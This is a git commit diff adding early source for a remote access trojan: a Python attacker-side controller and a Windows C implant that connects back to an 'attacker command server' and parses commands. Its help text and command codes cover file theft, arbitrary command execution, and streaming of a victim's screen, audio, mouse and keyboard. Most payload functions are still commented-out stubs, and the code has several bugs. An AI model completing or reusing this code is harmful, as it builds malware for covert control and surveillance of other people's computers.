3ed11f0c4dccd3aa4d33272ed4c67b4201df4451
NatAug62 <nataug62@gmail.com>
2020-12-20 19:13:06 -0500

    C command handling and some Python command handling

--- control/comms.py
+++ control/comms.py
@@ -2,20 +2,52 @@ import socket
 
 SERVER_PORT = 8080
 
-if __name__ == "__main__":
-	print('Starting program...')
+
+# change directory and list directory contents
+CHANGE_DIR = 1
+LIST_DIR = 2
+# upload and download files from/to attacker
+UPLOAD = 3
+DOWNLOAD = 4
+# run an arbitrary comamnd
+RUN_CMD = 5
+# start and end video, mouse, and audio streams
+START_VID = 6
+END_VID = 7
+START_MOUSE = 8
+END_MOUSE = 9
+START_AUDIO = 10
+END_AUDIO = 11
+START_KEYS = 13
+END_KEYS = 14
+# end the process (on the victim's computer)
+KILL_PROC = 12
+
+
+
+"""
+	Create a server socket and listen for an incoming connection
+	Returns the socket associated with the connection
+"""
+def openConnection(portNum):
+	print(f"Listening for connection on port {portNum} ...")
 
 	# create an IPv4 TCP server socket and set it up to listen
 	serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-	serversocket.bind(('', SERVER_PORT))
-	serversocket.listen(5)
+	serversocket.bind(('', portNum))
+	serversocket.listen()
 
 	# listen for incoming connections and accept them
 	(clientsocket, address) = serversocket.accept()
 
-	print('Client connected')
+	print("Connection established")
 
-	# echo messages back to the sender
+	# close the server socket and return the socket associated with the connection
+	serversocket.close()
+	return clientsocket
+
+"""
+	 echo messages back to the sender
 	while True:
 		data = clientsocket.recv(4096)
 		if not data:
@@ -24,3 +56,46 @@ if __name__ == "__main__":
 		data_s = b'ECHO: ' + data + b'\0'
 		print(data_s)
 		clientsocket.sendall(data_s)
+"""
+
+def handleCommand(cmd, cmdSocket):
+	if cmd.startswith(help):
+		print("cd [directory] - change current directory")
+		print("ls/dir - list directory contents")
+		print("upload [local file] [remote file] - upload file to victim computer")
+		print("download [remote file] [local file] - download file from victim computer")
+		print("exec [command line] - run command from command promp on victim computer")
+		print("video [start/stop] - start or stop streaming victim's screen")
+		print("audio [start/stop] - start or stop streaming victim's audio")
+		print("mouse [start/stop] - start or stop controlling victim's mouse")
+		print("keyboard [start/stop] - start or stop controlling victim's keyboard")
+		print("terminate - end the listening process on the victim's computer")
+		print("exit/stop/quit - end this process")
+	elif cmd.startswith("cd") and len(cmd) > 3:
+		cmdSocket.sendall(bytes([CHANGE_DIR]) + cmd[3:].encode('UTF-8') + b'\0')
+	elif cmd in ["ls", "dir"]:
+		cmdSocket.sendall(bytes([LIST_DIR]) + b'\0')
+		# TODO - receive the information from the socket
+		# TODO - option to list contents from arbitrary directory?
+	elif cmd.startswith("upload"):
+		args = cmd.split(" ")
+		if len(args) != 3:
+			return
+"""
+	Run the main loop for getting user input and 
+"""
+def main():
+	# establish a connection for sending commands
+	cmdSocket = openConnection(SERVER_PORT)
+
+	# main command loop
+	cmd = input(">")
+	while cmd not in ["exit", "stop", "quit"]:
+		handleCommand(cmd, cmdSocket)
+		cmd = input(">")
+
+	# close the main command socket
+	cmdSocket.close()
+
+if __name__ == "__main__":
+	main()
--- remote/comms.c
+++ remote/comms.c
@@ -3,66 +3,192 @@
 #include<stdio.h> // standard input/output
 #include<winsock2.h> // windows socket header
 
-#pragma comment(lib,"ws2_32.lib") // tell the linker to link the 
+#pragma comment(lib,"ws2_32.lib") // tell the linker to link the winsock library
 
-#define SERVER_ADDR "127.0.0.1"
-#define SERVER_PORT 8080
+// attacker IP and primary communication port
+#define CMD_SERVER_ADDR "127.0.0.1"
+#define CMD_SERVER_PORT 8080
 
-int main(int argc, char* argv[]) {
-	WSADATA wsa;
-	SOCKET sock;
+// change directory and list directory contents
+#define CHANGE_DIR 1
+#define LIST_DIR 2
+// upload and download files (from attacker's perspective)
+#define UPLOAD 3
+#define DOWNLOAD 4
+// run an arbitrary comamnd
+#define RUN_CMD 5
+// start and end video, mouse, and audio streams
+#define START_VID 6
+#define END_VID 7
+#define START_MOUSE 8
+#define END_MOUSE 9
+#define START_AUDIO 10
+#define END_AUDIO 11
+#define START_KEYS 13
+#define END_KEYS 14
+// end the process
+#define KILL_PROC 12
+
+// helper function for exiting on error
+void exitOnError() {
+	printf("Exiting program...\n");
+	return 1;
+}
+
+/*
+* Handle commands from the attacker server
+* Return the #DEFINE associated with the command
+*/
+char handleCommand(char* buffer) {
+	// get the command sent
+	char cmd = buffer[0];
+	// check what the command was and call the appropriate function
+	if (cmd == CHANGE_DIR) { // TODO - complete this later as QoL feature
+		printf("Changing directory...\n");
+		// shift the buffer left by one to get just the name of the directory to change to
+		for (int i = 1; i < 4096 && buffer[i-1] != '\0'; i++) {
+			buffer[i - 1] = buffer[i]; }
+		printf("Changing to directory %s\n", buffer);
+		//changeDirectory(buffer);
+	} else if (cmd == LIST_DIR) { // TODO - complete this later as QoL feature
+		printf("Listing directoy contents\n");
+		//listDirectoryContents();
+	} else if (cmd == DOWNLOAD) {
+		printf("Uploading file to controller\n");
+		// get the port to connect to then shift the buffer to be just the file name
+		int port = (buffer[1] * 256) + buffer[2];
+		for (int i = 3; i < 4096 && buffer[i - 1] != '\0'; i++) {
+			buffer[i - 3] = buffer[i]; }
+		printf("Uploading file %s on port %d\n", buffer, port);
+		//uploadFile(port, buffer);
+	} else if (cmd == UPLOAD) {
+		printf("Downloading file from controller\n");
+		// get the port to connect to then shift the buffer to be just the file name
+		int port = (buffer[1] * 256) + buffer[2];
+		for (int i = 3; i < 4096 && buffer[i - 1] != '\0'; i++) {
+			buffer[i - 3] = buffer[i];
+		}
+		printf("Downloading file %s on port %d\n", buffer, port);
+		//downloadFile(port, buffer);
+	} else if (cmd == RUN_CMD) {
+		printf("Running command prompt arguments...\n");
+		// shift the buffer left by one to get just command and its arguments
+		for (int i = 1; i < 4096 && buffer[i - 1] != '\0'; i++) {
+			buffer[i - 1] = buffer[i]; }
+		printf("Running %s from command prompt\n", buffer);
+		//runCommandPrompt(buffer);
+	} else if (cmd == START_VID) {
+		printf("Starting video stream...\n");
+		// get the port to connect to
+		int port = (buffer[1] * 256) + buffer[2];
+		printf("Streaming video to attacker on port %d\n", port);
+		//streamVideo(port);
+	} else if (cmd == END_VID) {
+		// TODO - determine how best to stop video stream
+	} else if (cmd == START_MOUSE) {
+		printf("Taking control of mouse...\n");
+		// get the port to connect to
+		int port = (buffer[1] * 256) + buffer[2];
+		printf("Attacker is controlling mouse from port %d\n", port);
+		//controlMouse(port);
+	} else if (cmd == END_MOUSE) {
+		// TODO - determine how best to stop mouse control
+	} else if (cmd == START_AUDIO) {
+		printf("Starting audio stream...\n");
+		// get the port to connect to
+		int port = (buffer[1] * 256) + buffer[2];
+		printf("Streaming audio to attacker on port %d\n", port);
+		//streamAudio(port);
+	} else if (cmd == END_AUDIO) {
+		// TODO - determine how best to stop audio stream
+	} else if (cmd == START_KEYS) {
+		printf("Taking control of keyboard...\n");
+		// get the port to connect to
+		int port = (buffer[1] * 256) + buffer[2];
+		printf("Attacker is controlling keyboard from port %d\n", port);
+		//controlKeyboard(port);
+	} else if (cmd == END_KEYS) {
+		// TODO - determine how best to stop keyboard control
+	} else if (cmd == KILL_PROC) {
+		printf("Ending process...\n");
+	} else {
+		printf("Unknown command received: %d\n", cmd);
+	}
+	return cmd;
+}
+
+/*
+* Connect to the primary command server
+* This is where we'll get the commands to do stuff
+* Secondary connections will be set up for streaming other data
+*/
+void connectToCommandServer() {
+	SOCKET sock; // TODO - might need to make this global
 	struct sockaddr_in server;
 	int retCode;
+	char cmd;
 	char buffer[4096];
 
-	// initialize winsock
-	retCode = WSAStartup(MAKEWORD(2, 2), &wsa);
-	if (retCode != 0) {
-		printf("WSAStartup failed with error: %d\n", retCode);
-		return 1;
-	}
-
-	// create a socket
+	// create the TCP socket
 	sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
 	if (sock == INVALID_SOCKET) {
 		printf("Could not create socket: %d\n", WSAGetLastError());
+		exitOnError();
 	}
 
-	// set the server info
-	server.sin_addr.s_addr = inet_addr(SERVER_ADDR);
+	// set the server info structure
+	server.sin_addr.s_addr = inet_addr(CMD_SERVER_ADDR);
 	server.sin_family = AF_INET;
-	server.sin_port = htons(SERVER_PORT);
+	server.sin_port = htons(CMD_SERVER_PORT);
 
-	// connect to the server
+	// connect to the attacker command server
 	if (connect(sock, (struct sockaddr*)&server, sizeof(server)) != 0) {
-		printf("Could not connect! Error code: %d\n", WSAGetLastError());
+		printf("Could not connect to command server! Error code: %d\n", WSAGetLastError());
+		exitOnError();
 	} else {
-		printf("Connected\n");
+		printf("Connected to command server\n");
 	}
 
-	// get input and send it, then wait for a response
-	while (1 == 1) {
-		if (fgets(buffer, 4096, stdin) == NULL) {
-			printf("Error when reading user input! Exiting program...\n");
-			return 1;
-		}
-		retCode = send(sock, buffer, (int) strlen(buffer), 0);
-		if (retCode == SOCKET_ERROR) {
-			printf("Send failed with error: %d\n", WSAGetLastError());
-			return 1;
-		}
+	// get and process commands from the attacker
+	do {
+		// get the next command and check for errors or a closed connection
 		retCode = recv(sock, buffer, 4096, 0);
-		if (retCode > 0) {
-			printf(buffer);
-		}
-		else if (retCode == 0) {
-			printf("Connection closed...\n");
+		if (retCode == 0) {
+			printf("Connection closed...\nExiting program...\n");
 			return 0;
-		}
-		else {
+		} else if (retCode < 0) {
 			printf("Recv failed with error: %d\n", WSAGetLastError());
+			exitOnError();
 		}
-	}
+		// if we got this far, we have a valid message to process
+		cmd = handleCommand(buffer);
+	} while (cmd != KILL_PROC);
 
+	// TODO - kill the connection gracefully
+}
+
+// TODO - remove testing function once no longer needed
+void test() {
+	char buffer[] = { CHANGE_DIR, 'C', ':', '\\', 'U', 's', 'e', 'r', 's', '\0' };
+	handleCommand(buffer);
+	char buffer2[] = {LIST_DIR, 'D', '\0' };
+	handleCommand(buffer2);
+	char buffer3[] = { UPLOAD, 127, 35, 'w', 'a', 'l', 'l', '.', 'p', 'n', 'g', '\0' };
+	handleCommand(buffer3);
+	char buffer4[] = { DOWNLOAD, 127, 35, 'w', 'a', 'l', 'l', '.', 'p', 'n', 'g', '\0' };
+	handleCommand(buffer4);
+}
+
+int main(int argc, char* argv[]) {
+	WSADATA wsa;
+	// initialize winsock
+	int retCode = WSAStartup(MAKEWORD(2, 2), &wsa);
+	if (retCode != 0) {
+		printf("WSAStartup failed with error: %d\n", retCode);
+		exitOnError();
+	}
+	//test();
+	// connect to the command server
+	connectToCommandServer();
 	return 0;
 }
